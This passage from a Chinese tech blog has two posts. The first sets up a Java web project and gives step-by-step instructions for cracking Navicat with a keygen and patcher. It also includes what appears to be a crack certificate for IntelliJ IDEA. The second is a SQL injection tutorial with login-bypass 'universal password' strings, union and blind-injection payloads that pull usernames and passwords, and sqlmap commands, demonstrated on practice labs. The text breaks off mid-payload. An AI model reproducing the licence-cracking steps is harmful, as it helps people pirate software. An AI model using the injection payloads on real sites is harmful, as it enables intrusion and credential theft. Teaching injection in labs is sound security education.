EiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure><p><img src="/img/20230212155256.png"></p><p>显示激活到2025年，其实是永久激活了。</p><p><img src="/img/20230212155410.png"></p><p><strong>idea设置中文</strong> </p><p>点击Plugins，搜索chinese，如图所示，点击Install。然后重启就是中文了。</p><p><img src="/img/20230212195045.png"></p><h1 id="3-下载tomcat"><a href="#3-下载tomcat" class="headerlink" title="3.下载tomcat"></a>3.下载tomcat</h1><p>tomcat8.5：<a href="https://www.aliyundrive.com/s/8Gze5mDq95T%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E6%98%AF%E4%B8%80%E4%B8%AAexe%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%8C%E5%87%BB%E5%8D%B3%E5%8F%AF%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%88%B0%E6%8C%87%E5%AE%9A%E8%B7%AF%E5%BE%84%E3%80%82">https://www.aliyundrive.com/s/8Gze5mDq95T，下载后是一个exe类型的压缩文件，双击即可解压缩到指定路径。</a></p><p><img src="/img/20230212155854.png"></p><h1 id="4-安装Navicat"><a href="#4-安装Navicat" class="headerlink" title="4.安装Navicat"></a>4.安装Navicat</h1><p>Navicat软件：<a href="https://www.aliyundrive.com/s/CBxNuERQ2ap">https://www.aliyundrive.com/s/CBxNuERQ2ap</a></p><p>Navicat永久激活工具：<a href="https://www.aliyundrive.com/s/tA5bdVkxCzN">https://www.aliyundrive.com/s/tA5bdVkxCzN</a></p><p>1.安装Navicat，选择“我同意”，下一步。</p><p>2.选择安装路径，我用的虚拟机就直接默认路径了。</p><p>3.下一步，安装，完成。</p><p><strong>永久激活Navicat</strong> </p><p>1.以管理员身份运行 NavicatCracker.exe</p><p><img src="/img/20230212160731.png"></p><p>2.断网</p><p><img src="/img/20230212160953.png"></p><p>3.选择Navicat的路径，点击Patch！</p><p><img src="/img/20230212161345.png"></p><p>4.选择“是”。</p><p><img src="/img/20230212161451.png"></p><p>5.点击Generate！生成Keygen。</p><p><img src="/img/20230212161600.png"></p><p>6.启动Navicat，点击注册。</p><p><img src="/img/20230212161726.png"></p><p>7.复制粘贴Keygen。</p><p><img src="/img/20230212161838.png"></p><p><img src="/img/20230212161923.png"></p><p>8.点击“激活”，然后选择“手动激活”。</p><p><img src="/img/20230212162036.png"></p><p>9.复制请求码到激活工具的Request Code。</p><p><img src="/img/20230212162240.png"></p><p>10.点击Generate Activation Code!，把生成的Activation Code复制到激活码。</p><p><img src="/img/20230212162522.png"></p><p>11.点击“激活”</p><p><img src="/img/20230212162707.png"></p><h1 id="5-安装MySQL"><a href="#5-安装MySQL" class="headerlink" title="5.安装MySQL"></a>5.安装MySQL</h1><p>两种方法：</p><h2 id="5-1第一种方法"><a href="#5-1第一种方法" class="headerlink" title="5.1第一种方法"></a>5.1第一种方法</h2><p>此方法只安装MySQL，但略显复杂。</p><p>MySQL5.7下载地址：<a href="https://mirrors.tuna.tsinghua.edu.cn/mysql/downloads/MySQL-5.7/mysql-5.7.36-winx64.msi">https://mirrors.tuna.tsinghua.edu.cn/mysql/downloads/MySQL-5.7/mysql-5.7.36-winx64.msi</a></p><p>安装教程：<a href="https://blog.csdn.net/m0_49284219/article/details/121972531">https://blog.csdn.net/m0_49284219/article/details/121972531</a></p><h2 id="5-2第二种方法"><a href="#5-2第二种方法" class="headerlink" title="5.2第二种方法"></a>5.2第二种方法</h2><p>此方法通过小皮安装MySQL，方便简洁。</p><p>小皮下载链接：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><p>安装完，直接启动MySQL5.7.26</p><p><img src="/img/20230212214252.png"></p><p>在数据库页面，点击操作，修改密码。</p><p><img src="/img/20230212214405.png"></p><p>输入新密码为123456</p><p><img src="/img/20230212214432.png"></p><h1 id="6-导入数据库文件"><a href="#6-导入数据库文件" class="headerlink" title="6.导入数据库文件"></a>6.导入数据库文件</h1><p>前面开启的MySQL服务不要关。打开Navicat，点击连接，选择MySQL。</p><p><img src="/img/20230212214819.png"></p><p>连接名随意，我这里写的mysql5.7，密码是123456，点击确定。</p><p><img src="/img/20230212214852.png"></p><p>双击mysql5.7</p><p><img src="/img/20230212215024.png"></p><p>右键选择新建数据库。</p><p><img src="/img/20230212215055.png"></p><p>数据库名与要导入的sql文件名一致，为secondhandmarket，字符集为utf8，排序规则为utf8_general_ci。</p><p><img src="/img/20230212215242.png"></p><p>双击刚刚建好的数据库，右键选择运行SQL文件。</p><p><img src="/img/20230212215411.png"></p><p>找到项目文件中的secondhandmarket.sql，导入即可。</p><p><img src="/img/20230212215604.png"></p><p><img src="/img/20230212215655.png"></p><p>在“表”处右键，选择刷新，就会出现导入的数据了。</p><p><img src="/img/20230212215733.png"></p><h1 id="7-下载项目源码"><a href="#7-下载项目源码" class="headerlink" title="7.下载项目源码"></a>7.下载项目源码</h1><p>二手交易平台：<a href="https://www.aliyundrive.com/s/JoK8jDpg9q3%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E6%98%AF%E4%B8%80%E4%B8%AAexe%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%8C%E5%87%BB%E5%8D%B3%E5%8F%AF%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%88%B0%E6%8C%87%E5%AE%9A%E8%B7%AF%E5%BE%84%E3%80%82">https://www.aliyundrive.com/s/JoK8jDpg9q3，下载后是一个exe类型的压缩文件，双击即可解压缩到指定路径。</a></p><p><img src="/img/20230212162849.png"></p><h1 id="8-项目导入idea"><a href="#8-项目导入idea" class="headerlink" title="8.项目导入idea"></a>8.项目导入idea</h1><p>打开。</p><p><img src="/img/20230212200324.png"></p><p>选择项目路径。</p><p><img src="/img/20230212200432.png"></p><p>信任项目。</p><p><img src="/img/20230212200609.png"></p><p>等待右下角进度条走完。</p><p><img src="/img/20230212200835.png"></p><p>在右上角Tomcat8.5处，点开，点击编辑配置。</p><p><img src="/img/20230212201746.png"></p><p>点击“配置”，选择下载的tomcat路径。</p><p><img src="/img/20230212201918.png"></p><p>选择edge浏览器，然后点击右下角的应用和确定。</p><p><img src="/img/20230212225033.png"></p><p>打开项目结构。</p><p><img src="/img/20230212225200.png"></p><p>检查项目的SDK是否为第一步安装的java。</p><p><img src="/img/20230212225256.png"></p><p>检查另一个SDK是否为第一步安装的java。</p><p><img src="/img/20230212225416.png"></p><p><strong>下载maven本地仓库</strong>：<a href="https://www.aliyundrive.com/s/WVZneXBaoG6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E6%98%AF%E4%B8%80%E4%B8%AAexe%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%8C%E5%87%BB%E5%8D%B3%E5%8F%AF%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%88%B0%E6%8C%87%E5%AE%9A%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%88%91%E6%94%BE%E5%88%B0%E4%BA%86C%E7%9B%98%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%94%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%A3%81%E7%9B%98%E3%80%82">https://www.aliyundrive.com/s/WVZneXBaoG6，下载后是一个exe类型的压缩文件，双击即可解压缩到指定路径，我放到了C盘根目录，也可以放到其他磁盘。</a></p><p><img src="/img/20230212230040.png"></p><p>打开设置。</p><p><img src="/img/20230212225453.png"></p><p>找到Maven，主路径选择idea内置的Maven 3，本地仓库，选择刚刚下载的仓库C:\Maven\repo</p><p><img src="/img/20230212230153.png"></p><p>检查连接数据库的文件jdbc.properties。</p><p><img src="/img/20230212230623.png"></p><p>打开pom.xml文件，在空白处右键——&gt;Maven——&gt;重新加载项目。</p><p><img src="/img/20230212230815.png"></p><p>启动项目。</p><p><img src="/img/20230212230941.png"></p><p>成功部署项目。</p><p><img src="/img/20230212231147.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/12/28/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/12/28/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>原理：目标网站对用户输入的字符没做过滤或者过滤不严谨，导致用户拼接的SQL语句可以在数据库执行。</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul><li>数据库信息泄露。</li><li>数据库信息被篡改。</li><li>登录认证被绕过。（万能密码问题）</li><li>其他，例如服务器文件被读取或修改，服务器上的程序被执行等。</li></ul><p>一旦发生SQL注入都是严重事件（高危）。</p><h1 id="万能密码（古老漏洞）"><a href="#万能密码（古老漏洞）" class="headerlink" title="万能密码（古老漏洞）"></a>万能密码（古老漏洞）</h1><p>如果一个网站使用数据库来存储用户登录信息，并执行如下的SQL语句进行登录尝试：</p><p> <code>select * from users where username=&#39;farmsec&#39; and password=&#39;123456&#39;</code> </p><p>在这种情况下，攻击者可注入用户名或密码字段，以修改应用程序执行的查询，从而破坏它的逻辑。例如攻击者知道应用程序的username为farmsec，那么他就可以通过提交一下用户名和任意密码，以管理员的身份登录： </p><p><code>farmsec&#39; --</code> </p><p>应用程序将执行以下查询： </p><p><code>select * from users where username=&#39;farmsec&#39; --&#39; and password=&#39;sadfas&#39;</code> </p><p>于是乎这个查询完全避开了密码检查。这也引出了经典的万能密码问题。</p><p>有些网站的登录页面其背后的逻辑就是上文中的语句。</p><p>我们可以在密码部分注入：<code>&#39;or 1=1 --</code></p><p>那么整个句子就变成：</p><p> <code>select * from users where username=&#39;farmsec&#39; and password=&#39;&#39;or 1=1 --</code></p><p>因为1永远等于1，登录验证就会被绕过。</p><p>一些常见的万能密码形式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin&#x27;-- </span><br><span class="line">admin&#x27; or 4=4-- </span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;-- </span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1-- </span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br></pre></td></tr></table></figure><h1 id="一些关键字"><a href="#一些关键字" class="headerlink" title="一些关键字"></a>一些关键字</h1><p>column_name：字段名<br>table_name：表名<br>schema_name：库名<br>information_schema：总库。<br>information_schema.columns：含有所有字段名的表。<br>information_schema.tables：含有所有表名的表。<br>information_schema.schemata：含有所有数据库名的表。<br>table_schema：information_schema.tables表中含有数据库名的那一列。</p><h1 id="SQL语句注释符"><a href="#SQL语句注释符" class="headerlink" title="SQL语句注释符"></a>SQL语句注释符</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#单行注释，注意与 url 中的#区分，经常编码为<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">-- 单行注释，在url地址栏写--空格，在页面输入提交的地方写--+</span></span><br><span class="line"><span class="comment">/*多行注释*/</span></span><br></pre></td></tr></table></figure><h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p><strong>从回显上来分：</strong></p><ul><li><p>显注，显注是指，当攻击者拼接SQL语句注入时，网站会把SQL语句的执行结果显示在网页上。</p></li><li><p>盲注，盲注与显注相反，网站不会把SQL语句的执行结果显示出来。</p></li></ul><p><strong>接受请求类型区分：</strong></p><ul><li>GET 注入，GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制，中文需要 URL 编码。 </li><li>POST 注入，POST 请求参数是放在请求 body 里的，长度没有限制。</li></ul><p><strong>以注入位置区分：</strong></p><ul><li>cookie注入，参数存在于cookie中，与数据库交互。</li><li>User-Agent注入，UA与数据库交互。</li><li>一般参数，例如id。</li></ul><p><img src="/img/20220925102319.png"></p><h1 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h1><h2 id="1-判断否存在注入和类型"><a href="#1-判断否存在注入和类型" class="headerlink" title="1 判断否存在注入和类型"></a>1 判断否存在注入和类型</h2><p>原理：我们输入的数据在数据库执行了。那怎么判断是否执行了呢？</p><p>先看报错信息：<code>You have an error in your SQL syntax</code> 这句话是mysql数据库经典的语句报错信息。出现这句话基本可以判定我们输入的语句在数据库执行导致了报错，并且判断出数据库类型为mysql。</p><p>没有SQL报错信息，就要按下面的方法试验我们注入的语句是否在数据库执行了。</p><p><strong>第一种判断方法</strong></p><p>id&#x3D;<code>1&#39; and &#39;1&#39;=&#39;1</code>能正常查询，id&#x3D;1’ and ‘1’&#x3D;’2查询不出来，可判断存在注入。</p><p>select * from users where id&#x3D;’<code>1&#39; and &#39;1&#39;=&#39;1</code>‘</p><p>select * from users where id&#x3D;’<code>1&#39; and 1=1%23</code>‘</p><p>select * from users where id&#x3D;’<code>1&#39; and 1=2%23</code>‘</p><p><strong>第二种判断方法</strong></p><p>id&#x3D;1’ and sleep(5)–+，有时间延迟可判断存在注入。</p><h2 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2 判断字段数"></a>2 判断字段数</h2><p>利用 order by 猜解 SQL 查询语句中的字段数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; order by 2%23</span><br></pre></td></tr></table></figure><h2 id="3-显示字段信息"><a href="#3-显示字段信息" class="headerlink" title="3 显示字段信息"></a>3 显示字段信息</h2><p>利用联合查询显示上一步两个字段的内容。</p><p>id参数为负，不显示union前的查询信息，避免混淆。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2%23</span><br></pre></td></tr></table></figure><h2 id="4-查库名"><a href="#4-查库名" class="headerlink" title="4 查库名"></a>4 查库名</h2><p>把1或2替换成查询语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前用户名：</span><br><span class="line">id=-1&#x27; union select 1,user()%23</span><br><span class="line">当前库名：</span><br><span class="line">id=-1&#x27; union select 1,database()%23</span><br><span class="line">数据库版本和当前用户名：</span><br><span class="line">id=-1&#x27; union select version(),user()%23</span><br></pre></td></tr></table></figure><h2 id="5-查表名"><a href="#5-查表名" class="headerlink" title="5 查表名"></a>5 查表名</h2><p>查询当前库的所有表名，在第二个查询位建立一个子查询。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema =database())%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">group_concat() 分组，把括号内字段的值打印在一行，逗号分隔(默认)。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">跟limit差不多。</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select table_name from information_schema.tables where table_schema =database() limit 1,1)%23</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">2</span>,<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select table_name from information_schema.tables where table_schema =database() limit 3,1)%23</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">4</span>,<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">#group_concat()比较方便但是有时候数据显示不全，limit更严谨但是更麻烦。</span><br></pre></td></tr></table></figure><h2 id="6-查字段名"><a href="#6-查字段名" class="headerlink" title="6 查字段名"></a>6 查字段名</h2><p>查询users表的字段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name =&#x27;users&#x27;)%23</span><br></pre></td></tr></table></figure><h2 id="7-查用户名和密码"><a href="#7-查用户名和密码" class="headerlink" title="7 查用户名和密码"></a>7 查用户名和密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select username,password from users%23</span><br></pre></td></tr></table></figure><p>当只有一个查询位，但是需要查询多个字段的时候时可以用 group_concat(username,password) ，组拼接。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,(select group_concat(username,password) from users)%23</span><br></pre></td></tr></table></figure><h1 id="get注入"><a href="#get注入" class="headerlink" title="get注入"></a>get注入</h1><p>例子出自sqli-labs，less-1</p><p>按照提示输入合法参数 ?id&#x3D;1</p><p>用burpsuite对页面进行抓包 可以发现，http使用的是get请求，同时在URL中也可以看得到参数的传递。</p><p>尝试在输入中加入’ 检查是否存在注入点。 发现输入后，页面有提示错误，表示有注入点。</p><p>使用sqlmap进行注入测试 使用命令：<code>sqlmap -u &quot;http://192.168.0.180/sqli-labs/Less-1/?id=1&quot; -p id</code></p><h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><p>打开靶机sqli-labs，进入less-11页面</p><p><img src="/img/20230617152026.png"></p><p>先使用dumb用户进行登录。尝试抓包查看数据包 发现这里用的是post请求，同时URL中也不再显示参数。</p><p><img src="/img/20230617152324.png"></p><p>尝试通过修改数据包的post参数，加入’测试能否注入 发现web报错，说明有注入点。</p><p><img src="/img/20230617152457.png"></p><p><img src="/img/20230617152534.png"></p><p>使用sqlmap进行注入测试 使用sqlmap -r测试。</p><p><img src="/img/20230617154053.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r less11.txt --dbms=&quot;mysql&quot; -p uname --dbs</span><br></pre></td></tr></table></figure><p><img src="/img/20230617160949.png"></p><h1 id="1-union-联合注入"><a href="#1-union-联合注入" class="headerlink" title="1 union 联合注入"></a>1 union 联合注入</h1><p>联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进 行联合查询。两个表的字段要数要相同，不然会出现报错。</p><p>dvwa的users表有8个字段，联合users表查询的时候需用8个数字占据8个查询位才不会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id=1 union select 1,2,3,4,5,6,7,8</span><br></pre></td></tr></table></figure><p><img src="/img/20220824200945.png"></p><p>可以看到guestbook是dvwa的另一个表，from guestbook 和 from users 加不加都行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id=1 union select 1,2,3,4,5,6,7,8 from guestbook</span><br></pre></td></tr></table></figure><p><img src="/img/20220824201424.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id=1 union select 1,2,3,4,5,6,7,8 from users</span><br></pre></td></tr></table></figure><p><img src="/img/20220824201505.png"></p><p>guestbook 表有3个字段，与 guestbook 表联合查询时需用3个数字占据3个查询位才不会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE comment_id=1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/img/20220824201938.png"></p><p>这些数字可以替换成字段的名称或者函数。</p><p><img src="/img/20220824202350.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE comment_id=1 union select user_id,user,password from users</span><br></pre></td></tr></table></figure><p><img src="/img/20220824202620.png"></p><p>可以把 comment_id 设置为负或为空 null ，只显示我们需要的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE comment_id=null union select 1,user,password from users</span><br></pre></td></tr></table></figure><p><img src="/img/20220824205945.png"></p><p>在加上 limit 1 限制只显示一行的时候，若 union 前的查询语句不为负或空，那么union后的信息就不会显示出来。</p><p><img src="/img/20220824210358.png"></p><p>0x3B是分号，可以作为分隔符。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3B,database(),0x3B,version())--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220826220150.png"></p><p><img src="/img/20220826220208.png"></p><p><img src="/img/20220826221019.png"></p><p>也可以用hex值代替表名等。</p><p><img src="/img/20220826222132.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x7573657273 limit 1))--+</span><br></pre></td></tr></table></figure><p><img src="/img/20220826222317.png"></p><h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2 布尔盲注"></a>2 布尔盲注</h1><p>布尔型注入攻击，因为页面不会返回任何数据库内容，所以不能使用联合查询将敏感信息显示在页面。</p><p>以dvwa为例：</p><p>输入1，id存在，显示User ID exists in the database.</p><p>输入-1，id不存在，显示User ID is MISSING from the database.</p><p>像这样可以返回对错的注入点，可以使用布尔盲注构造SQL攻击语句。</p><h3 id="判断字符长度"><a href="#判断字符长度" class="headerlink" title="判断字符长度"></a>判断字符长度</h3><p>输入：<code>1&#39; and length(user())&gt;5#</code> 1后面的单引号闭合前面语句。 <code>length()</code>函数会返回括号内的字符串长度，例如<code>length(’abc‘)</code>返回3。函数<code>user()</code>能查询数据库的用户名。<code>length(user())</code>即会查询用户名的长度。 这句话的逻辑很简单，如果当前用户名字的长度大于5，则整个条件为真，数据库就去查询有无ID为1的用户，而我们知道ID为1的用户是存在的。所以应用一定会返回：User ID exists in the database. 如果当前用户名字的长度小于5，应用则会返回User ID is MISSING from the database. 虽然我们不能让应用显示详细信息，但我们可以让它回答：是或否。 我们来看看结果： 应用返回真，于是我们知道了当前用户名的长度大于5。</p><p><img src="/img/20230605203845.png"></p><p>我们接着输入：<code>1&#39; and length(user())&gt;20#</code>。</p><p><img src="/img/20230605203959.png"></p><p>应用返回假，于是，我们知道了当前用户名的长度小于20大于5。</p><p>我们反复执行这个过程，会越来越缩小范围。最终可以用等于确定。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(user())=14#</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230605204059.png"></p><h3 id="判断字符的字母"><a href="#判断字符的字母" class="headerlink" title="判断字符的字母"></a>判断字符的字母</h3><p>到此我们确定了用户名长度为14。</p><p>开始确定用户名，因为我们只能让web应用回复：是或否。 所以我们只能一个字母一个字母来猜。 输入：<code>1&#39; and substring(user(),1,1)=&#39;a&#39;#</code></p><p>这里的substring()函数的作用是提取字符串中的字符.例如:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">substring</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>) #返回a</span><br><span class="line"><span class="built_in">substring</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="number">3</span>,<span class="number">1</span>) #返回c</span><br><span class="line"><span class="built_in">substring</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="number">3</span>,<span class="number">2</span>) #返回cd</span><br></pre></td></tr></table></figure><p>所以注入这个SQL语句的目的就是要取出当前用户名字的第一个字母，用二分法来找出这个字母是什么，接着找第二个字母，然后第三个……</p><p>运用二分法，我们继续注入：<code>1&#39; and substring(user(),1,1)&lt;&#39;z&#39;#</code></p><p><img src="/img/20230605204706.png"></p><p>后续依此逻辑可以得到全部14位的用户名；</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),3,1)=&#x27;</span>o<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),5,1)=&#x27;</span>@<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">6</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;l&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),7,1)=&#x27;</span>o<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),9,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">10</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;l&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),11,1)=&#x27;</span>h<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">12</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;o&#x27;</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(user(),13,1)=&#x27;</span>s<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">14</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>#</span><br></pre></td></tr></table></figure><p>最终得到，用户名为：<code>root@localhost</code></p><p>如果想猜测当前数据库，其原理也和上文一样。</p><p>首先猜数据库的长度（方法和上方一样），经过注入发现长度为4 <code>1&#39; and length(database())=4#</code></p><p>然后，依次注入4位数据库库名的字母。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substring(database(),1,1)=&#x27;</span>d<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="built_in">substring</span>(database(),<span 